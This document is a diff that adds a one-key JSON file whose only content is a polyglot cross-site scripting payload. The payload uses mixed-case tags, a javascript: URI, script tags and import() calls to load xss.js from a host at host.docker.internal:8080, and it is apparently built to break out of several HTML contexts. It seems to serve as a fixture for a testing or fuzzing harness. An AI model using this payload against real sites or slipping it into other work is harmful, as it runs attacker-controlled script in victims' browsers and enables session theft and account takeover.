@@ -1,0 +1,4 @@
+{
+	"payload": "jAvAsCriPt:'<ScRiPt sRc=`http://host.docker.internal:8080/xss.js`></ScRiPt>sCrIpT--!><ScRiPt sRc=\"http://host.docker.internal:8080/xss.js\"></ScRiPt><iMg oNLoAd='<!--xMp> OnBlUr=*/sOurCe>*import(`http://host.docker.internal:8080/xss.js`) onClICk=import(\"http://host.docker.internal:8080/xss.js\")/>tITle>sVg--!>iNpUt> onClICk=( oNLoAd=--!>/>, oNFoCus='iNpUt&gt; oNtOgGle='frAmEsEt>&lt;iMg*/teMplAte>'\"--!>"
+
+}
